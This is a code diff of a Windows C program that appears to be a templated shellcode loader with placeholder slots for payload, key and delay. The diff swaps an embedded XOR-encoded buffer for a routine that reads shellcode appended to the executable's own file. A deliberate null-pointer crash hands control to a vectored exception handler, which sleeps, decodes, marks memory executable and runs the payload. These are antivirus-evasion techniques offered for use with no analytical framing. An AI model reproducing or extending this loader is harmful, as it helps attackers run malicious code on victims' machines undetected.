@@ -1,11 +1,46 @@
 #include <windows.h>
 #include <shlwapi.h>
-@@@slot@@@
-#define XOR_KEY @@@slot_0@@@
 
-int g_flag = 0;
-unsigned char buf[@@@slot_1@@@] = @@@slot_2@@@;
-@@@slot_3@@@
+int read_pe_slot(int index, void *pdata) {
+	HANDLE h_file = NULL;
+	DWORD num_read = 0;
+	WCHAR file_name[MAX_PATH];
+	DWORD data_size=0;
+	DWORD file_tail=0;
+	
+	GetModuleFileNameW(NULL, file_name, MAX_PATH);
+	h_file = CreateFileW(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+	file_tail = SetFilePointer(h_file, 0, NULL, FILE_END);
+	
+	SetFilePointer(h_file, file_tail-4, NULL, FILE_BEGIN);
+	ReadFile(h_file, &data_size, 4, &num_read, NULL);
+	
+	int slot_cnt = 0;
+	while(data_size) {
+		SetFilePointer(h_file, -(data_size+8), NULL, FILE_CURRENT);
+		ReadFile(h_file, &data_size, 4, &num_read, NULL);
+		++slot_cnt;
+	}
+	
+	if(0<=index && index<slot_cnt) {
+		SetFilePointer(h_file, file_tail-4, NULL, FILE_BEGIN);
+		ReadFile(h_file, &data_size, 4, &num_read, NULL);
+		
+		for(int iter=slot_cnt-1; iter>index; --iter) {
+			SetFilePointer(h_file, -(data_size+8), NULL, FILE_CURRENT);
+			ReadFile(h_file, &data_size, 4, &num_read, NULL);
+		}
+		SetFilePointer(h_file, -(data_size+4), NULL, FILE_CURRENT);
+		if(pdata)
+			ReadFile(h_file, pdata, data_size, &num_read, NULL);
+	} else {
+		data_size = 0;
+	}
+	
+	
+	CloseHandle(h_file);
+	return data_size;
+}
 
 PVOID veh_op(PVOID p_veh) {
     return AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)p_veh);
@@ -70,20 +105,27 @@ void write_temp_file_and_exec(unsigned char *file_data, int file_data_len, LPCWS
 }
 
 void handler() {
+	static int g_flag = 0;
 	if(!g_flag) {
-		PVOID p_shellcode = alloc(sizeof(buf));
-		memcpy(p_shellcode, buf, sizeof(buf));
-		decode(p_shellcode, sizeof(buf), XOR_KEY, 4);
-		rx(p_shellcode, sizeof(buf));
-		@@@slot_4@@@;
 		g_flag = 1;
-		exec(p_shellcode);
+		
+		// do something before exec shellcode
+		@@@slot_2@@@
+		
+		DWORD sc_size = read_pe_slot(0, NULL);
+		PVOID p_sc = alloc(sc_size);
+		read_pe_slot(0, p_sc);
+		WaitForSingleObject(GetCurrentProcess(), @@@slot_0@@@);
+		// decode shellcode
+		@@@slot_1@@@
+		rx(p_sc, sc_size);
+		exec(p_sc);
 	}
 }
 
 int main() {
     veh_op((PVOID)handler);
     int *p = nullptr;
-    *p = 888;
+    *p = @@@slot_3@@@;
     return 0;
 } 
